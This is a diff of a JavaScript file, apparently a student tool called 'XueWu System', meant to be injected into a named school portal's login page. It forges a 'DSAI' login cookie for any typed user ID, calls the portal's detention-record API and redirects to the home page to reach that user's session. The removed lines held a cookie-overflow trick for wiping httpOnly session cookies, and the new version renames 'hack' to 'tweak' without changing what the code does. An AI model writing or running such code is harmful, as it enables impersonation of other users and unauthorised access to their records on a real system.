@@ -1,34 +1,25 @@
-/* XueWu System Core Javascript
+/* XueWu System Core Javascript version 1.8
  * (C)opyright 2024 KCISHackers.
  * All Rights reserved.
  * Visit: https://www.github.com/KCISHacker/XueWuSystem for more info.
  */
+console.log("Hello from XueWu System Core Javascript. (C)opyright 2024 KCISHackers. All Rights reserved. Visit: https://www.github.com/KCISHacker/XueWuSystem for more info.");
+console.log("XueWu: Ciallo～(∠・ω< )⌒★");
 /*
- * Debug log. Set 'hacker_debug' to true to enable
+ * Debug log. Set 'tweaker_debug' to true to enable
  */
-var hacker_debug=true;
+var tweaker_debug=true;
 function log(info){
-    hacker_debug&&console.log(info);
+    tweaker_debug&&console.log(info);
 }
-/* Tweaking function. Should be used in portal.kciesc.com
+/* Tweaking function. It should be injected into portal.kciesc.com/China/Account/Login page
  * Redirect to /DSAI/Home to validate the tweak after running.
  */
-function hack(id){
-    log("Hacking "+id);
-    var date=new Date();
-    date.setTime(date.getTime()+3600000);
-    /*Delete all cookies(uses overflow to delete httpOnly cookies)*/
-    log("Attacking session cookie");
-    for(let i=0;i<100;i++)
-        log("Creating spam cookie: "+(document.cookie='cookie'+i+'='+i+';expires='+date.toUTCString()));
-    var oldest_time=new Date(0);
-    /*Delete spam cookies after attack*/
-    for(let i=0;i<100;i++)
-        document.cookie='cookie'+i+'=0;expires='+oldest_time.toUTCString();
-    log('Spam cookies are been deleted');
+function tweak(id){
+    log("Tweaking "+id);
     /*Create fake login cookie*/
     document.cookie="DSAI="+id+";expires="+date.toGMTString()+";path=/";
-    /*Get hacked session*/
+    /*Fetch API to get new tweaked session*/
     log("Detention API returned:");
     fetch(window.location.origin+'/DSAI/Query/Form_ListDetention?strKeyWord1=')
     .then(response=>response.json()).then(data=>log(data))
@@ -38,18 +29,28 @@ function hack(id){
             alert(id+' seems not exist. Check your spelling.');
             return;
         }
-        alert("Error while hacking "+id+"! "+error);successed=false;
+        alert("Error while tweaking "+id+"! "+error);successed=false;
     }()))
 }
-/* Visual interface (Tweaking DOM of portal.kcisec.com/DSAI/Home) */
-
+/* Visual interface (Tweaking DOM) */
 function core(){
     console.log("Hello from XueWuSystem: Ciallo～(∠・ω< )⌒★")
-    if(document.getElementById("hacked")){
-        alert('This page had already been hacked! Do not run twice!');
+    if(document.getElementById("tweaked")){
+        alert('This page had already been tweaked! Do not run twice!');
+        return;
+    }
+    /*Code for clicking submit button*/
+    function btn_onclick(){
+        if(document.getElementById("UserId").value==''){
+            alert('Username field cannot be empty!');
+            return;
+        }
+        tweak(document.getElementById("UserId").value);
+        log("done tweaking, redirecting to /DSAI/Home");
+        window.location.href="/DSAI/Home";
     }
     /*Details*/
-    document.getElementsByClassName("main_logout")[0].innerText="hacked by 学武系统hacker";
+    document.getElementsByClassName("main_logout")[0].innerText="tweaked by 学武系统tweaker";
     document.getElementsByClassName("ui-input-text ui-body-inherit ui-corner-all ui-shadow-inset")[1].
     innerHTML="<div style=\"color:red\">This program is for learning reference only, rather than abusing, or you'll take the risk!</div>";
     document.getElementById("UserId").addEventListener("keyup",function(event){
@@ -58,17 +59,10 @@ function core(){
             btn_onclick();
         }
     });
-    /*Override event of submit button*/
-    document.getElementsByName('btn_s')[0].removeEventListener("click", function(){});
-    function btn_onclick(){
-        if(document.getElementById("UserId").value==''){
-            alert('Username field cannot be empty!');
-            return;
-        }
-        hack(document.getElementById("UserId").value);
-        log("done hacking, redirecting to /DSAI/Home");
-        window.location.href="/DSAI/Home";
-    }
     document.getElementsByName('btn_s')[0].addEventListener("click",btn_onclick);
-    document.body.innerHTML += '<div id="hacked"></div>';
+    var mark=document.createElement('div');
+    mark.id='tweaked';
+    document.body.appendChild(mark);
 }
+/*This script should be injected into portal.kciesc.com/China/Account/Login page*/
+core();
